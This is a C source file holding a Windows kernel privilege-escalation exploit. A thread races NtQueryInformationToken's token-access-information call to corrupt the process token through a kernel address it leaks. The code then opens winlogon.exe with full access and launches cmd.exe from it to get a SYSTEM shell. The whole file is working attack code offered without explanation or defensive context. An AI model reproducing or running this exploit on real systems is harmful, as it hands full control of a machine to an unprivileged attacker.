#include <Windows.h>
#include <stdio.h>
#include "ex.h"


///
// Helper stuff for kernel R/W using Nt(Read/Write)VirtualMemory
//

#pragma comment(lib, "ntdll.lib")

#define OFFSET_PID 0x440
#define OFFSET_PROCESS_LINKS 0x448
#define OFFSET_TOKEN 0x4b8
#define OFFSET_KPROCESS 0x220

typedef NTSTATUS(*pNtWriteVirtualMemory)(
	IN HANDLE               ProcessHandle,
	IN PVOID                BaseAddress,
	IN PVOID                Buffer,
	IN ULONG                NumberOfBytesToWrite,
	OUT PULONG              NumberOfBytesWritten OPTIONAL
	);

typedef NTSTATUS(*pNtReadVirtualMemory)(
	IN HANDLE               ProcessHandle,
	IN PVOID                BaseAddress,
	OUT PVOID               Buffer,
	IN ULONG                NumberOfBytesToRead,
	OUT PULONG              NumberOfBytesReaded OPTIONAL)
	;

typedef NTSTATUS NtQueryInformationToken(
	HANDLE                  TokenHandle,
	TOKEN_INFORMATION_CLASS TokenInformationClass,
	PVOID                   TokenInformation,
	ULONG                   TokenInformationLength,
	PULONG                  ReturnLength
);

typedef struct _AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION
{
	ULONG SecurityAttributeCount;                                           //0x0
	struct _LIST_ENTRY SecurityAttributesList;                              //0x4
	ULONG WorkingSecurityAttributeCount;                                    //0xc
	struct _LIST_ENTRY WorkingSecurityAttributesList;                       //0x10
} AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION, *PAUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION;

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

//
// Global vars
//
NtQueryInformationToken* pQueryInfoToken = 0;
HANDLE hToken;
BYTE* TokenInfo = 0;
DWORD Infolen = 0x1000;
DWORD retlen = 0;
DWORD OffsetToName = 0;
BYTE* RaceAddr = 0;
ULONGLONG kTokenAddr = 0;

void RaceThread() {
	ULONGLONG value = kTokenAddr + 0x40 - 4;
	for (int i = 0; i < 0x10000; i++) {
		*(WORD*)(RaceAddr + 2) = 2;
		*(ULONGLONG*)(RaceAddr + 8) = value;
	}	
}

int main() {
	HMODULE ntdll = GetModuleHandleA("ntdll");
	pQueryInfoToken = (NtQueryInformationToken*)GetProcAddress(ntdll, "NtQueryInformationToken");

	OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
	kTokenAddr = (ULONGLONG)GetKernelPointerByHandle(hToken);
	printf("hToken: %x, kTokenAddr: %p\n", hToken, kTokenAddr);

	getchar();


	TokenInfo = (BYTE*)VirtualAlloc(0, Infolen, MEM_COMMIT, PAGE_READWRITE);
	if (!TokenInfo)
		return -1;

	NTSTATUS status = pQueryInfoToken(hToken, (TOKEN_INFORMATION_CLASS)22, TokenInfo, Infolen, &retlen);

	if (status == 0) {
		_AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION* pSecurityAttributes = (_AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION*)((_TOKEN_ACCESS_INFORMATION*)TokenInfo)->SecurityAttributes;
		if (pSecurityAttributes->SecurityAttributeCount) {
			BYTE* Flink = (BYTE*)pSecurityAttributes->SecurityAttributesList.Flink;
			if (Flink) {
				OffsetToName = Flink + 0x20 - TokenInfo;
				printf("Found target offset value: 0x%x\n", OffsetToName);
			}
		}
	}

	if (!OffsetToName)
		return -1;

	RaceAddr = TokenInfo + OffsetToName;
	printf("Target address = 0x%llx\n", RaceAddr);
	//getchar();

	HANDLE hWinLogon = INVALID_HANDLE_VALUE;
	ULONG pid = GetPidByName(L"winlogon.exe");
	while(1) {
		HANDLE h = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)RaceThread, 0, 0, 0);
		SetThreadPriority(h, THREAD_PRIORITY_TIME_CRITICAL);

		//DebugBreak();
		for (int i = 0; i < 5000; i++)
			pQueryInfoToken(hToken, (TOKEN_INFORMATION_CLASS)22, TokenInfo, Infolen, &retlen);

		WaitForSingleObject(h, INFINITE);

		hWinLogon = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
		if (hWinLogon)
			break;
	}
	
	printf("Got Winlogon handle: 0x%x\n", hWinLogon);
	getchar();

	CreateProcessFromHandle(hWinLogon, (LPSTR)"C:\\Windows\\system32\\cmd.exe");

	CloseHandle(hWinLogon);
	CloseHandle(hToken);

	return 0;
}